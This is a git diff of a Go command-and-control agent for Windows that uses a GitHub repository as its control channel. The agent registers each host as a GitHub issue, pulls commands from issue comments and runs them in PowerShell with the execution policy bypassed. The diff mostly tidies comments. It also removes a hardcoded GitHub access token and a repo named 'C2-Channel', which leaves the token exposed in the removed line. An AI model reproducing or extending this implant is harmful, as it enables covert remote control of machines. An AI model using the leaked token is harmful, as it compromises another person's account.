@@ -20,8 +20,8 @@ import (
 )
 
 const (
-	githubToken = "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" // 🔒 Replace with your GitHub Token
-	repoName    = "CaptShiva007/C2-Channel"                                                                       // 🔒 Replace with your GitHub Repo
+	githubToken = "" //Replace with your GitHub Token
+	repoName    = "" //Replace with your GitHub Repo
 )
 
 var (
@@ -30,7 +30,7 @@ var (
 	jobHandle   windows.Handle
 )
 
-// **1️⃣ Create Windows Job Object with Termination Monitoring**
+// Create Windows Job Object with Termination Monitoring
 func createJobObject() {
 	var err error
 	jobHandle, err = windows.CreateJobObject(nil, nil)
@@ -38,7 +38,7 @@ func createJobObject() {
 		log.Fatalf("❌ Failed to create job object: %v", err)
 	}
 
-	// **Enforce process termination when job object is closed**
+	//Enforce process termination when job object is closed
 	var info windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION
 	info.BasicLimitInformation.LimitFlags = windows.JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
 	_, err = windows.SetInformationJobObject(jobHandle, windows.JobObjectExtendedLimitInformation, uintptr(unsafe.Pointer(&info)), uint32(unsafe.Sizeof(info)))
@@ -46,7 +46,7 @@ func createJobObject() {
 		log.Fatalf("❌ Failed to set job object information: %v", err)
 	}
 
-	// Assign the current process to the job object
+	//Assign the current process to the job object
 	self, err := windows.GetCurrentProcess()
 	if err != nil {
 		log.Fatalf("❌ Failed to get current process: %v", err)
@@ -60,12 +60,12 @@ func createJobObject() {
 	fmt.Println("🔒 Agent is now protected by a Windows Job Object.")
 }
 
-// **2️⃣ Register Agent with GitHub**
+// Register Agent with GitHub
 func registerAgent() {
 	hostname, _ := os.Hostname()
 	agentID = uuid.New().String() // Generate a unique ID
 
-	// Create an issue on GitHub
+	//Create an issue on GitHub
 	payload := map[string]string{
 		"title": fmt.Sprintf("Agent Registered: %s | %s", hostname, agentID),
 		"body":  "Agent is now active and awaiting commands.",
@@ -78,7 +78,7 @@ func registerAgent() {
 	fmt.Printf("✅ Agent Registered: %s | %s\n", hostname, agentID)
 }
 
-// **3️⃣ Create GitHub Issue**
+// Create GitHub Issue**
 func createGitHubIssue(payload map[string]string) int {
 	url := fmt.Sprintf("https://api.github.com/repos/%s/issues", repoName)
 	data, _ := json.Marshal(payload)
@@ -104,7 +104,7 @@ func createGitHubIssue(payload map[string]string) int {
 	return 0
 }
 
-// **4️⃣ Fetch & Execute Commands from GitHub**
+// Fetch & Execute Commands from GitHub
 var lastProcessedCommentID int
 
 func executeCommands() {
@@ -154,11 +154,11 @@ func executeCommands() {
 	}
 }
 
-// **5️⃣ Execute the Received Command (PowerShell)**
+// Execute the Received Command (PowerShell)
 func executeCommand(command string) {
 	fmt.Printf("⚡ Executing: %s\n", command)
 
-	// Ensure proper encoding to capture single-line outputs like `whoami`
+	//Ensure proper encoding to capture single-line outputs like `whoami`
 	cmdStr := strings.TrimSpace(strings.TrimPrefix(command, "Command: "))
 	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
 		"-Command", fmt.Sprintf("[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; %s", cmdStr))
@@ -195,12 +195,12 @@ func executeCommand(command string) {
 	}
 }
 
-// **6️⃣ Handle Exit & Cleanup**
+// Handle Exit & Cleanup
 func cleanup() {
 	if issueNumber != 0 {
 		fmt.Println("🔴 Agent received termination signal. Shutting down...")
 
-		// Send termination update
+		//Send termination update
 		url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d/comments", repoName, issueNumber)
 		commentPayload := map[string]string{"body": fmt.Sprintf("Agent [%s] received termination signal. Shutting down...", agentID)}
 		data, _ := json.Marshal(commentPayload)
@@ -210,14 +210,14 @@ func cleanup() {
 		req.Header.Set("Accept", "application/vnd.github.v3+json")
 
 		client := &http.Client{}
-		client.Do(req) // Send shutdown message
+		client.Do(req) //Send shutdown message
 
-		// Close the issue
+		//Close the issue
 		closeIssue()
 	}
 }
 
-// **7️⃣ Close the GitHub Issue**
+// Close the GitHub Issue
 func closeIssue() {
 	url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d", repoName, issueNumber)
 	payload := map[string]string{"state": "closed"}
